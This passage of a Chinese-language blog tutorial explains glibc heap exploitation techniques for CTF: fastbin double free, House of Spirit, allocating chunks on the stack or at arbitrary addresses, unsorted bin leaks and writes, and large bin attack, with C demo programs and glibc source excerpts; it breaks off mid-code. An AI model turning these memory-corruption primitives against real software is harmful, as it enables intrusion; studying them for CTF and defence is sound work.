class="headerlink" title="分类"></a>分类</h2><ul><li>Fastbin Double Free</li><li>House of Spirit</li><li>Alloc to Stack</li><li>Arbitrary Alloc</li></ul><p>前两种侧重利用<code>free</code>释放掉<strong>真的chunk或伪造的chunk</strong>，然后再次申请chunk进行攻击，后两种侧重故意修改<code>fd</code>指针，直接用<code>malloc</code>申请指定位置的chunk进行攻击</p><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 </p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2,*chunk3;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    chunk3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-comment">//进行释放</span><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk3);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>释放前</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000041</span> &lt;=== chunk1<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000041</span> &lt;=== chunk2<br><span class="hljs-number">0x602050</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602080</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000041</span> &lt;=== chunk3<br><span class="hljs-number">0x602090</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020a0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020b0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020c0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000020f41</span> &lt;=== top chunk<br></code></pre></td></tr></table></figure><p>三次<code>free</code>后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000041</span> &lt;=== chunk1<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000041</span> &lt;=== chunk2<br><span class="hljs-number">0x602050</span>:   <span class="hljs-number">0x0000000000602000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602080</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000041</span> &lt;=== chunk3<br><span class="hljs-number">0x602090</span>:   <span class="hljs-number">0x0000000000602040</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020a0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020b0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020c0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000020f41</span> &lt;=== top chunk<br></code></pre></td></tr></table></figure><p>可以看到此时的三个 chunk 组成了一个单向链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">Fastbins[idx=<span class="hljs-number">2</span>, size=<span class="hljs-number">0x30</span>,ptr=<span class="hljs-number">0x602080</span>]<br>===&gt;Chunk(fd=<span class="hljs-number">0x602040</span>, size=<span class="hljs-number">0x40</span>, flags=PREV_INUSE)<br>===&gt;Chunk(fd=<span class="hljs-number">0x602000</span>, size=<span class="hljs-number">0x40</span>, flags=PREV_INUSE)<br>===&gt;Chunk(fd=<span class="hljs-number">0x000000</span>, size=<span class="hljs-number">0x40</span>, flags=PREV_INUSE)<br></code></pre></td></tr></table></figure><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>fastbin中chunk可以被多次释放，因此可以在fastbin链表存在多次，这样导致多次从fastbin链表取出同一块堆块，相当于多个指针指向同一个堆块</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ul><li>fastbin的堆块释放后next_chunk的pre_inuse位不会清空</li><li>fastbinfree时仅验证main_arena直接指向的块，对于链表后的块并没有验证</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Another simple check: make sure the top of the bin is not the</span><br><span class="hljs-comment">       record we are going to add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>      &#123;<br>        errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>fastbin是FIFO机制</p><p>我们可以在chunk1释放后再释放chunk2，这样使main_arena指向chunk2，此时再次释放chunk1就不会被检测到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2,*chunk3;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一次<code>free</code></p><p><img src="/2025/03/19/%E5%A0%86%E7%9A%84%E6%94%BB%E5%87%BB/1743521938798.png" alt="diyici"></p><p>第二次<code>free</code></p><p><img src="/2025/03/19/%E5%A0%86%E7%9A%84%E6%94%BB%E5%87%BB/1743521962305.png" alt="dierci"></p><p>第三次<code>free</code></p><p><img src="/2025/03/19/%E5%A0%86%E7%9A%84%E6%94%BB%E5%87%BB/1743522158810.png" alt="disanci"></p><p>此时chunk1的fd指向了chunk2</p><p>接着malloc将第一个chunk1释放掉，再修改chunk1中fd指针为target_addr，这样Fastbin就变成了main_arena-&gt;chunk2-&gt;chunk1-&gt;target_addr，这样我们就可以分配到target_addr处的堆块，这样就可以在此进行读写</p><p><strong>但int_malloc_会对即将分配位置的size域检查，如果size和当前fastbin链表应该有size不符就抛出异常</strong></p><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><h3 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h3><p>该技术核心在于在目标位置伪造fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的chunk的目的</p><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>想伪造fastbin chunk并放入fastbin链表中，那么就要绕过一些必要的检查</p><ul><li>fake chunk的<strong>ISMMAP位不能为1</strong>，因为mmap分配的chunk会被单独处理</li><li>fake chunk的地址需要<strong>对齐</strong></li><li>fake chunk的size的大小需要<strong>满足fastbin的要求，同时需要对齐</strong></li><li>fask chunk的next chunk的大小不能小于<code>2*SIZE_SZ</code>，同时不能大于<code>av-&gt;system_mem</code></li><li>fake chunk对应的fastbin<strong>链表头不能是fake chunk</strong>，即不能构成double free情况</li></ul><p>（以上注意事项源码里都有）</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>该技术分配chunk到指定地址，其实不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址前后的内容使其能够绕过检测</strong></p><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>关键在于劫持 fastbin 链表里的 chunk 的<code>fd</code>指针，把<code>fd</code>指针指向我们想要分配的栈上，从而控制栈上的一些关键数据，比如返回地址等</p><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>该代码将 fake_chunk 置于栈中的称为 stack_chunk </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> pre_size;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> size;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fd;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> bk;<br>&#125; CHUNK,*PCHUNK;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    CHUNK stack_chunk;<br><br>    <span class="hljs-type">void</span> *chunk1;<br>    <span class="hljs-type">void</span> *chunk_a;<br><br>    stack_chunk.size=<span class="hljs-number">0x21</span>;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)chunk1=&amp;stack_chunk;<span class="hljs-comment">//修改fd指针为stack_chunk</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//第一次分配使fastbin链表指向了stack_chunk，意味着下一次分配会用stack_chunk进行</span><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//此时分配的就是stack_chunk了</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要<strong>劫持 fastbin 中 chunk 的 fd 域</strong>，把它指到栈上，当然同时需要栈上存在有<strong>满足条件的 size 值</strong>。 </p><h2 id="Arbirary-Alloc"><a href="#Arbirary-Alloc" class="headerlink" title="Arbirary Alloc"></a>Arbirary Alloc</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>与Alloc to Stack完全相同，唯一区别是目标不再是栈中，事实上只要目标地址存在合法size域（人为的还是自然的都无所谓），我们可以把chunk分配到任意的可写内存中，比如bss、heap、data、stack等</p><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>Arbitrary Alloc在CTF中用的更加频繁。我们可以利用字节错位等方法来绕过size域的检查，实现任意地址分配chunk，最后效果也就相当于任意地址写任意值</p><h1 id="Unsorted-Bin-Attack"><a href="#Unsorted-Bin-Attack" class="headerlink" title="Unsorted Bin Attack"></a>Unsorted Bin Attack</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul><li>Unsorted Bin Attack 被利用前提：控制Unsorted Bin Chunk的bk指针</li><li>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值</li></ul><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><h3 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h3><ul><li>当一个较大的chunk分割成两半时，若剩下的大于MINSIZE<br>，就会被放到unsorted bin中</li><li>释放一个不属于fastbin的chunk且其不与top chunk相邻时，就会首先被放到unsorted bin中</li></ul><h3 id="使用情况"><a href="#使用情况" class="headerlink" title="使用情况"></a>使用情况</h3><ol><li>遍历顺序：FIFO <strong>插入时插入到unsorted bin头部，取出时从链表尾获取</strong></li><li>malloc 时，如果从fastbin和small bin中找不到对应大小的chunk，就会尝试从unsorted bin中寻找chunk，<strong>若满足用户，就返回给用户，否则放到对应的chunk中</strong></li></ol><h2 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h2><h3 id="Unsorted-bin结构"><a href="#Unsorted-bin结构" class="headerlink" title="Unsorted bin结构"></a>Unsorted bin结构</h3><p>双向链表</p><p><img src="/2025/03/19/%E5%A0%86%E7%9A%84%E6%94%BB%E5%87%BB/1744214176709.png" alt="结构"></p><p>可以看到链表中的尾节点的 <code>fd</code> 指针会指向 <code>main_arena</code> 结构体内部。 </p><h3 id="Leak原理"><a href="#Leak原理" class="headerlink" title="Leak原理"></a>Leak原理</h3><ul><li>泄露<code>fd</code>指针，得到一个与<code>main_arena</code>有<strong>固定偏移</strong>的地址</li><li>这个地址相对于 <code>libc</code> 基址是固定的偏移，从而实现对<code>ASLR</code>的绕过</li></ul><h3 id="获取main-arena和libc基址偏移"><a href="#获取main-arena和libc基址偏移" class="headerlink" title="获取main_arena和libc基址偏移"></a>获取main_arena和libc基址偏移</h3><h4 id="malloc-trim函数得出"><a href="#malloc-trim函数得出" class="headerlink" title="_malloc_trim函数得出"></a>_malloc_trim函数得出</h4><p>将.<code>so</code>文件放到IDA中，找到<code>__malloc_trim</code>函数，就可以获得偏移了</p><p><img src="/2025/03/19/%E5%A0%86%E7%9A%84%E6%94%BB%E5%87%BB/1744215074848.png" alt="IDA"></p><h4 id="通过-malloc-hook算出"><a href="#通过-malloc-hook算出" class="headerlink" title="通过_malloc_hook算出"></a>通过_malloc_hook算出</h4><p><code>main_arena</code>和<code>_malloc_hook</code>的地址差是0x10，而大多数libc都可以直接查出<code>_malloc_hook</code>的地址，这样就可以减少工作量</p><p>pwntools:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">main_arena_offset = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>).symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br></code></pre></td></tr></table></figure><h3 id="实现leak"><a href="#实现leak" class="headerlink" title="实现leak"></a>实现leak</h3><ul><li>一般需要有 <code>UAF</code>，将一个 chunk 放入 <code>Unsorted Bin </code>中后再打出其 <code>fd</code>。一般的笔记管理题都会有<code> show</code> 的功能，对处于链表尾的节点 <code>show </code>就可以获得 libc 的基地址了</li><li>CTF中的利用，堆往往是刚初始化的，所以<code>Unsorted Bin</code>中是干净的，当里面只有一个<code>bin</code>时，该<code>bin</code>的<code>fd</code>和<code>bk</code>都会指向<code>main_arena</code></li><li>当链表尾无法访问时，可以访问链表头，对链表头的<code>printf</code>往往可以把<code>fd</code>和<code>bk</code>一起输出出来，但在64位环境下，高地址往往是<code>\x00</code>截断<code>printf</code>的输出，无法做到有效leak</li></ul><h2 id="Unsorted-Bin-Attack原理"><a href="#Unsorted-Bin-Attack原理" class="headerlink" title="Unsorted Bin Attack原理"></a>Unsorted Bin Attack原理</h2><p>当将一个 unsorted bin 取出时，会将<code>bck-&gt;fd</code>位置写入本unsorted bin的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>也就是说如果我们控制了<code>bk</code>的值，我们就能将<code>unsorted_chunk</code>写到任意地址</p><h2 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h2><p><img src="/2025/03/19/%E5%A0%86%E7%9A%84%E6%94%BB%E5%87%BB/1744300551204.png" alt="图示"></p><ul><li>初始：<ul><li>unsorted bin 的 <code>fd</code>、<code>bk</code>都指向本身</li></ul></li><li>free(p)<ul><li>由于p大小不属于fast bin，所以其会被先放到unsorted bin中</li></ul></li><li>修改p[1]<ul><li>修改后，原来在unsorted bin中的p的bk就会指向target-0x10处的伪造的chunk，Taget valus处于伪造的chunk的fd处</li></ul></li><li>申请400大小的chunk<ul><li>此时申请的chunk在small bin范围内，但bin中没有chunk，所以去unsorted bin中找，发现其不为空，于是取出最后一个chunk</li></ul></li><li>结果<ul><li>修改target处的值为unsorted bin链表头地址</li><li>可以修改任意地址但是修改的值却不受我们的控制</li></ul></li><li>作用<ul><li>我们通过修改循环的次数来使得程序可以执行多次循环。</li><li>我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</li></ul></li></ul><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>通过控制<code>unsortedbin</code>里的空闲<code>chunk-&gt;bk</code>，来实现任意地址写</p><p>操作：</p><ul><li>将<code>bk</code>修改成为<code>target_addr-0x10</code></li><li>在取出<code>chunk</code>的时候，即可往<code>target_addr</code>处写入<code>unsortedbin</code>链表头的地址，也就是 <code>main_arena + 0x58</code>（glibc &lt; 2.26）或 <code>main_arena + 0x68</code>（glibc ≥ 2.26）</li></ul><h1 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h1><h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><p>主要利用chunk进入bin中的操作，在malloc时，遍历unsorted bin，对每一个chunk，若无法exact-fit分配（精准匹配分配）或不满足切割分配的要求，就会将chunk置入大小对应的bin中，<strong>而此过程缺乏对large bin跳表指针（fd_nextsize和bk_nextsize）的检查</strong></p><p>2.29版本及以下，根据unsorted bin大小不同</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br></code></pre></td></tr></table></figure><p>unsorted bin小于链表中最小的chunk时候执行<strong>前一句</strong>，else后一句</p><p>当<strong>二者大小相同</strong>时执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size<br>              == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (fwd))<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br></code></pre></td></tr></table></figure><p>所以此时<strong>无法利用</strong>（将新堆块插入到链表第二个位置，是固定的，不会影响<code>fd_nextsize</code>和<code>bk_nextsize</code>，所以无法利用）</p><p>所以有两种利用方法</p><p>在2.30版本新加入对large bin跳表的完整性的检查，使unsorted chunk<strong>大于</strong>链表中最小的chunk的时候利用<strong>失效</strong>，<strong>必须使unsorted bin小于链表中最小的chunk</strong>，通过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br></code></pre></td></tr></table></figure><p>实现将本chunk的地址写入到<code>bk_nextsize+0x20</code>处</p><h2 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h2><p>核心源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>            &#123;<br>                victim-&gt;fd_nextsize = fwd;<br>                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                fwd-&gt;bk_nextsize = victim;<br>                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>            &#125;<br>            bck = fwd-&gt;bk;<br></code></pre></td></tr></table></figure><p>例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// gcc large_bin_attack.c -o large_bin_attack -g</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span><br>                    <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x320</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br>                    <span class="hljs-string">&quot; the first large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br>                    <span class="hljs-string">&quot; the second large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>    <span 